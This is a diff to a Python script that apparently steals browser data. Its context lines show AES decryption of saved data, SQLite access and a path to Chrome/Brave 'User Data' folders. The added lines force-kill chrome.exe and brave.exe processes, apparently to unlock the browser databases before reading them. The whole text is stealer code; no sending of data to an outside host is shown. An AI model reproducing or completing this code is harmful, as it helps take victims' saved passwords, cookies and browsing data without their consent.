@@ -6,6 +6,7 @@ import shutil
 import sqlite3
 from datetime import datetime
 from Crypto.Cipher import AES
+import psutil
 
 def convert_date(i_time):
     if int(i_time) == 0:
@@ -36,6 +37,14 @@ def decript_data(data, key):
             return ""
 
 def get_data(navegador: list):
+    #matar procesos
+    for proc in psutil.process_iter(['pid','name']):
+        if proc.info['name'] == 'chrome.exe':
+            proc.kill()
+        if proc.info['name'] == 'brave.exe':
+            proc.kill()
+
+
     #directorio de trabajo
     work_dir = os.path.expanduser('~')+f'/AppData/Local/{navegador[0]}/{navegador[1]}/User Data'
     
